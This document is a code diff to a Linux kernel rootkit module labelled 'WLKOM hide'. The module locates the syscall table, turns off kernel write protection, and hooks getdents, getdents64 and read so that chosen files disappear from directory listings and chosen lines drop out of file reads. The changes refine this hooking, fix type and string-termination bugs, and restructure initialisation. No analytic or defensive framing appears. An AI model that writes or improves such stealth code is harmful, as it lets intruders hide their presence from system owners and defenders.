@@ -9,6 +9,19 @@
 #include <linux/version.h>
 #include "hide.h"
 
+/* ─── Original syscall function pointers ─── */
+/* ATTENTION: Une seule déclaration de chaque */
+
+static long (*orig_getdents64)(unsigned int fd,
+                                struct linux_dirent64 __user *dirent,
+                                unsigned int count) = NULL;
+
+static long (*orig_getdents)(unsigned int fd,
+                              struct linux_dirent __user *dirent,
+                              unsigned int count) = NULL;
+
+static long (*orig_read)(unsigned int fd, char __user *buf, size_t count) = NULL;
+
 /* ─── syscall table hooking ─── */
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
@@ -38,15 +51,6 @@ struct hidden_line {
 
 static LIST_HEAD(hidden_lines);
 
-/* Original syscalls */
-typedef int (*orig_getdents64_t)(unsigned int, struct linux_dirent64 __user *, unsigned int);
-typedef int (*orig_getdents_t)(unsigned int, struct linux_dirent __user *, unsigned int);
-typedef long (*orig_read_t)(unsigned int, char __user *, size_t);
-
-static orig_getdents64_t orig_getdents64 = NULL;
-static orig_getdents_t   orig_getdents   = NULL;
-static orig_read_t       orig_read       = NULL;
-
 /* ─── Write protection helpers ─── */
 
 static void disable_write_protect(void)
@@ -61,35 +65,20 @@ static void enable_write_protect(void)
     write_cr0(cr0 | 0x00010000UL);
 }
 
-/* ─── Lookup syscall table ─── */
-
-static unsigned long *get_syscall_table(void)
-{
-#ifdef KPROBE_LOOKUP
-    kallsyms_lookup_name_t lookup;
-    register_kprobe(&kp);
-    lookup = (kallsyms_lookup_name_t)kp.addr;
-    unregister_kprobe(&kp);
-    return (unsigned long *)lookup("sys_call_table");
-#else
-    return (unsigned long *)kallsyms_lookup_name("sys_call_table");
-#endif
-}
-
 /* ─── Hooked getdents64 ─── */
 
-static int hooked_getdents64(unsigned int fd,
-                              struct linux_dirent64 __user *dirent,
-                              unsigned int count)
+static long hooked_getdents64(unsigned int fd,
+                               struct linux_dirent64 __user *dirent,
+                               unsigned int count)
 {
-    int ret = orig_getdents64(fd, dirent, count);
+    long ret = orig_getdents64(fd, dirent, count);
     if (ret <= 0)
         return ret;
 
     int                           bpos = 0;
     struct hidden_file           *hf;
     char                         *buf;
-    int                           new_ret = ret;
+    long                          new_ret = ret;
 
     buf = kmalloc(ret, GFP_KERNEL);
     if (!buf)
@@ -125,18 +114,18 @@ next:;
 
 /* ─── Hooked getdents (32-bit compat) ─── */
 
-static int hooked_getdents(unsigned int fd,
-                            struct linux_dirent __user *dirent,
-                            unsigned int count)
+static long hooked_getdents(unsigned int fd,
+                             struct linux_dirent __user *dirent,
+                             unsigned int count)
 {
-    int ret = orig_getdents(fd, dirent, count);
+    long ret = orig_getdents(fd, dirent, count);
     if (ret <= 0)
         return ret;
 
     struct hidden_file *hf;
     char               *buf;
     int                 bpos = 0;
-    int                 new_ret = ret;
+    long                new_ret = ret;
 
     buf = kmalloc(ret, GFP_KERNEL);
     if (!buf)
@@ -238,6 +227,7 @@ void hide_file(const char *name)
     if (!hf)
         return;
     strncpy(hf->name, name, sizeof(hf->name) - 1);
+    hf->name[sizeof(hf->name) - 1] = '\0';
     list_add(&hf->list, &hidden_files);
 }
 
@@ -258,7 +248,9 @@ void hide_line(const char *filename, const char *pattern)
     if (!hl)
         return;
     strncpy(hl->filename, filename, sizeof(hl->filename) - 1);
+    hl->filename[sizeof(hl->filename) - 1] = '\0';
     strncpy(hl->pattern, pattern, sizeof(hl->pattern) - 1);
+    hl->pattern[sizeof(hl->pattern) - 1] = '\0';
     list_add(&hl->list, &hidden_lines);
 }
 
@@ -278,17 +270,41 @@ void unhide_line(const char *filename, const char *pattern)
 
 int hide_init(void)
 {
-    syscall_table = get_syscall_table();
-    if (!syscall_table) {
-        pr_err("WLKOM hide: cannot find syscall table\n");
+    kallsyms_lookup_name_t kallsyms_lookup_name_fn;
+
+    pr_info("WLKOM hide: initializing...\n");
+
+#ifdef KPROBE_LOOKUP
+    /* Kernel >= 5.7: use kprobe to find kallsyms_lookup_name */
+    register_kprobe(&kp);
+    kallsyms_lookup_name_fn = (kallsyms_lookup_name_t)kp.addr;
+    unregister_kprobe(&kp);
+#else
+    /* Kernel < 5.7: kallsyms_lookup_name is exported */
+    kallsyms_lookup_name_fn = kallsyms_lookup_name;
+#endif
+
+    if (!kallsyms_lookup_name_fn) {
+        pr_err("WLKOM hide: failed to find kallsyms_lookup_name\n");
         return -1;
     }
 
-    disable_write_protect();
+    /* Find syscall table */
+    syscall_table = (unsigned long *)kallsyms_lookup_name_fn("sys_call_table");
+    if (!syscall_table) {
+        pr_err("WLKOM hide: failed to find syscall_table\n");
+        return -1;
+    }
 
-    orig_getdents64 = (orig_getdents64_t)syscall_table[__NR_getdents64];
-    orig_getdents   = (orig_getdents_t)syscall_table[__NR_getdents];
-    orig_read       = (orig_read_t)syscall_table[__NR_read];
+    pr_info("WLKOM hide: syscall_table found at %px\n", syscall_table);
+
+    /* Save original syscalls */
+    orig_getdents64 = (typeof(orig_getdents64))syscall_table[__NR_getdents64];
+    orig_getdents   = (typeof(orig_getdents))syscall_table[__NR_getdents];
+    orig_read       = (typeof(orig_read))syscall_table[__NR_read];
+
+    /* Hook syscalls */
+    disable_write_protect();
 
     syscall_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
     syscall_table[__NR_getdents]   = (unsigned long)hooked_getdents;
@@ -296,10 +312,7 @@ int hide_init(void)
 
     enable_write_protect();
 
-    /* Hide our own directory */
-    hide_file("wlkom");
-
-    pr_info("WLKOM hide: initialized\n");
+    pr_info("WLKOM hide: syscalls hooked\n");
     return 0;
 }
 
